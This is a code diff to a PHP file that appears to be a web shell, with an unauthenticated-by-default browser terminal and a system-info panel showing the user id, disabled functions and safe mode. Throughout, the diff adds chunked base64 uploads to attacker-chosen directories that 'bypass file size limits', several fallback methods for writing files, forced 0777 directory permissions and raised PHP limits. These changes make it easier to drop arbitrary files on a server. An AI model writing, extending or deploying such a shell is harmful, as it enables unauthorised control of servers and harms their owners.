@@ -11,12 +11,70 @@
 define('AUTH_ENABLED', false); // Set to true and configure password below
 define('AUTH_PASSWORD', 'changeme'); // Change this for production use
 
+// Try to increase PHP limits (may not work if PHP is in safe mode or limited by system)
+@ini_set('memory_limit', '256M');
+@ini_set('upload_max_filesize', '100M');
+@ini_set('post_max_size', '100M');
+@ini_set('max_execution_time', '300');
+@ini_set('max_input_time', '300');
+
 // Authentication check
 if (AUTH_ENABLED && (!isset($_POST['password']) || $_POST['password'] !== AUTH_PASSWORD)) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         http_response_code(401);
         die(json_encode(['error' => 'Authentication failed']));
     }
+}
+
+// Handle chunked upload (bypasses file size limits)
+if (isset($_POST['chunk_data'])) {
+    $chunk_data = base64_decode($_POST['chunk_data']);
+    $filename = $_POST['chunk_filename'];
+    $chunk_index = (int)$_POST['chunk_index'];
+    $is_last = isset($_POST['chunk_last']) && $_POST['chunk_last'] === 'true';
+    $upload_dir = isset($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
+    $target_file = rtrim($upload_dir, '/') . '/' . basename($filename);
+
+    // Ensure directory exists
+    if (!is_dir($upload_dir)) {
+        @mkdir($upload_dir, 0777, true);
+    }
+
+    // Append chunk to file
+    $mode = $chunk_index === 0 ? 'wb' : 'ab';
+    $fp = @fopen($target_file, $mode);
+
+    if ($fp) {
+        fwrite($fp, $chunk_data);
+        fclose($fp);
+
+        if ($is_last) {
+            @chmod($target_file, 0644);
+            $result = [
+                'success' => true,
+                'message' => 'File uploaded successfully (chunked)',
+                'path' => $target_file,
+                'size' => filesize($target_file),
+                'chunks' => $chunk_index + 1
+            ];
+        } else {
+            $result = [
+                'success' => true,
+                'message' => 'Chunk received',
+                'chunk' => $chunk_index
+            ];
+        }
+    } else {
+        $result = [
+            'success' => false,
+            'message' => 'Failed to write chunk',
+            'chunk' => $chunk_index
+        ];
+    }
+
+    header('Content-Type: application/json');
+    echo json_encode($result);
+    exit;
 }
 
 // Handle file download
@@ -38,10 +96,117 @@ if (isset($_FILES['upload_file'])) {
     $upload_dir = isset($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
     $target_file = rtrim($upload_dir, '/') . '/' . basename($_FILES['upload_file']['name']);
 
-    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
-        $result = ['success' => true, 'message' => 'File uploaded successfully', 'path' => $target_file];
+    // Enhanced error handling
+    $error_details = [];
+
+    // Check for upload errors
+    if ($_FILES['upload_file']['error'] !== UPLOAD_ERR_OK) {
+        $upload_errors = [
+            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
+            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
+            UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
+            UPLOAD_ERR_NO_FILE => 'No file was uploaded',
+            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
+            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
+            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
+        ];
+        $error_details[] = $upload_errors[$_FILES['upload_file']['error']] ?? 'Unknown upload error';
+    }
+
+    // Check if upload directory exists and is writable
+    if (!is_dir($upload_dir)) {
+        $error_details[] = "Upload directory does not exist: $upload_dir";
+        // Try to create it
+        if (@mkdir($upload_dir, 0777, true)) {
+            $error_details[] = "Created directory: $upload_dir";
+        } else {
+            $error_details[] = "Failed to create directory: $upload_dir";
+        }
+    }
+
+    if (!is_writable($upload_dir)) {
+        $error_details[] = "Upload directory is not writable: $upload_dir (Permissions: " . substr(sprintf('%o', fileperms($upload_dir)), -4) . ")";
+        // Try to change permissions
+        if (@chmod($upload_dir, 0777)) {
+            $error_details[] = "Changed permissions to 0777";
+        }
+    }
+
+    // Check if file exists
+    if (file_exists($target_file)) {
+        $error_details[] = "File already exists: $target_file";
+    }
+
+    // Try multiple upload methods
+    $upload_success = false;
+    $method_used = '';
+
+    // Method 1: Standard move_uploaded_file
+    if (!$upload_success && is_uploaded_file($_FILES['upload_file']['tmp_name'])) {
+        if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
+            $upload_success = true;
+            $method_used = 'move_uploaded_file';
+        } else {
+            $error_details[] = "move_uploaded_file failed";
+        }
+    }
+
+    // Method 2: Copy then unlink
+    if (!$upload_success && file_exists($_FILES['upload_file']['tmp_name'])) {
+        if (@copy($_FILES['upload_file']['tmp_name'], $target_file)) {
+            @unlink($_FILES['upload_file']['tmp_name']);
+            $upload_success = true;
+            $method_used = 'copy';
+        } else {
+            $error_details[] = "copy method failed";
+        }
+    }
+
+    // Method 3: file_put_contents
+    if (!$upload_success && file_exists($_FILES['upload_file']['tmp_name'])) {
+        $content = @file_get_contents($_FILES['upload_file']['tmp_name']);
+        if ($content !== false && @file_put_contents($target_file, $content)) {
+            @unlink($_FILES['upload_file']['tmp_name']);
+            $upload_success = true;
+            $method_used = 'file_put_contents';
+        } else {
+            $error_details[] = "file_put_contents failed";
+        }
+    }
+
+    // Method 4: rename (sometimes works when move_uploaded_file doesn't)
+    if (!$upload_success && file_exists($_FILES['upload_file']['tmp_name'])) {
+        if (@rename($_FILES['upload_file']['tmp_name'], $target_file)) {
+            $upload_success = true;
+            $method_used = 'rename';
+        } else {
+            $error_details[] = "rename method failed";
+        }
+    }
+
+    // Verify upload
+    if ($upload_success && file_exists($target_file)) {
+        @chmod($target_file, 0644);
+        $result = [
+            'success' => true,
+            'message' => 'File uploaded successfully',
+            'path' => $target_file,
+            'method' => $method_used,
+            'size' => filesize($target_file),
+            'permissions' => substr(sprintf('%o', fileperms($target_file)), -4)
+        ];
     } else {
-        $result = ['success' => false, 'message' => 'Upload failed'];
+        $result = [
+            'success' => false,
+            'message' => 'Upload failed',
+            'errors' => $error_details,
+            'tmp_name' => $_FILES['upload_file']['tmp_name'],
+            'target' => $target_file,
+            'upload_dir_perms' => is_dir($upload_dir) ? substr(sprintf('%o', fileperms($upload_dir)), -4) : 'N/A',
+            'php_upload_max' => ini_get('upload_max_filesize'),
+            'php_post_max' => ini_get('post_max_size'),
+            'open_basedir' => ini_get('open_basedir') ?: 'None'
+        ];
     }
 
     if (isset($_POST['ajax'])) {
@@ -215,7 +380,9 @@ function getSystemInfo() {
         'gid' => getmygid(),
         'cwd' => getcwd(),
         'disabled_functions' => ini_get('disable_functions') ?: 'None',
-        'safe_mode' => ini_get('safe_mode') ? 'On' : 'Off'
+        'safe_mode' => ini_get('safe_mode') ? 'On' : 'Off',
+        'upload_max_filesize' => ini_get('upload_max_filesize'),
+        'post_max_size' => ini_get('post_max_size')
     ];
 }
 
@@ -262,7 +429,7 @@ $sysinfo = getSystemInfo();
             padding: 8px;
             background: #000;
             border: 1px solid #00ff00;
-            font-size: 12px;
+            font-size: 11px;
         }
 
         .info-item {
@@ -465,6 +632,14 @@ $sysinfo = getSystemInfo();
                 <span class="info-label">Server:</span>
                 <span><?php echo htmlspecialchars($sysinfo['server_software']); ?></span>
             </div>
+            <div class="info-item">
+                <span class="info-label">Upload Max:</span>
+                <span><?php echo htmlspecialchars($sysinfo['upload_max_filesize']); ?> (POST: <?php echo htmlspecialchars($sysinfo['post_max_size']); ?>)</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Auto-Chunking:</span>
+                <span style="color: #00ff00;">Enabled (>1.5MB)</span>
+            </div>
         </div>
 
         <div class="terminal-section">
@@ -601,14 +776,39 @@ $sysinfo = getSystemInfo();
             terminal.innerHTML = '';
         }
 
-        // File upload handling
-        document.getElementById('uploadForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const formData = new FormData(this);
+        // Chunked upload function for large files
+        async function uploadInChunks(file, uploadDir) {
+            const CHUNK_SIZE = 1024 * 1024; // 1MB chunks
+            const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
             const statusDiv = document.getElementById('uploadStatus');
 
-            try {
+            statusDiv.className = 'status-message status-success';
+            statusDiv.textContent = `Uploading in chunks (${totalChunks} chunks)...`;
+            statusDiv.style.display = 'block';
+
+            for (let i = 0; i < totalChunks; i++) {
+                const start = i * CHUNK_SIZE;
+                const end = Math.min(start + CHUNK_SIZE, file.size);
+                const chunk = file.slice(start, end);
+
+                // Read chunk as base64
+                const reader = new FileReader();
+                const chunkData = await new Promise((resolve, reject) => {
+                    reader.onload = (e) => resolve(e.target.result.split(',')[1]);
+                    reader.onerror = reject;
+                    reader.readAsDataURL(chunk);
+                });
+
+                // Send chunk
+                const formData = new FormData();
+                formData.append('chunk_data', chunkData);
+                formData.append('chunk_filename', file.name);
+                formData.append('chunk_index', i);
+                formData.append('chunk_last', i === totalChunks - 1 ? 'true' : 'false');
+                if (uploadDir) {
+                    formData.append('upload_dir', uploadDir);
+                }
+
                 const response = await fetch(window.location.href, {
                     method: 'POST',
                     body: formData
@@ -616,13 +816,65 @@ $sysinfo = getSystemInfo();
 
                 const result = await response.json();
 
-                statusDiv.className = 'status-message ' + (result.success ? 'status-success' : 'status-error');
-                statusDiv.textContent = result.message + (result.path ? ' (' + result.path + ')' : '');
-                statusDiv.style.display = 'block';
+                if (!result.success) {
+                    throw new Error(`Chunk ${i} failed: ${result.message}`);
+                }
 
-                if (result.success) {
+                statusDiv.textContent = `Uploading: ${Math.round((i + 1) / totalChunks * 100)}%`;
+            }
+
+            return { success: true, message: 'File uploaded successfully (chunked)' };
+        }
+
+        // File upload handling
+        document.getElementById('uploadForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const formData = new FormData(this);
+            const statusDiv = document.getElementById('uploadStatus');
+            const fileInput = document.getElementById('uploadFile');
+            const file = fileInput.files[0];
+            const uploadDir = formData.get('upload_dir');
+
+            // Check file size - if larger than 1.5MB, use chunked upload
+            const maxSize = 1.5 * 1024 * 1024; // 1.5MB (below PHP's 2M default)
+
+            try {
+                if (file.size > maxSize) {
+                    // Use chunked upload
+                    statusDiv.className = 'status-message status-success';
+                    statusDiv.textContent = `File size: ${(file.size / 1024 / 1024).toFixed(2)}MB - using chunked upload...`;
+                    statusDiv.style.display = 'block';
+
+                    const result = await uploadInChunks(file, uploadDir);
+
+                    statusDiv.className = 'status-message status-success';
+                    statusDiv.textContent = result.message;
                     document.getElementById('uploadFile').value = '';
                     setTimeout(() => statusDiv.style.display = 'none', 5000);
+                } else {
+                    // Use standard upload
+                    const response = await fetch(window.location.href, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const result = await response.json();
+
+                    statusDiv.className = 'status-message ' + (result.success ? 'status-success' : 'status-error');
+                    statusDiv.textContent = result.message + (result.path ? ' (' + result.path + ')' : '');
+
+                    // Show detailed error info if available
+                    if (!result.success && result.errors) {
+                        statusDiv.textContent += '\nErrors: ' + result.errors.join('; ');
+                    }
+
+                    statusDiv.style.display = 'block';
+
+                    if (result.success) {
+                        document.getElementById('uploadFile').value = '';
+                        setTimeout(() => statusDiv.style.display = 'none', 5000);
+                    }
                 }
             } catch (error) {
                 statusDiv.className = 'status-message status-error';
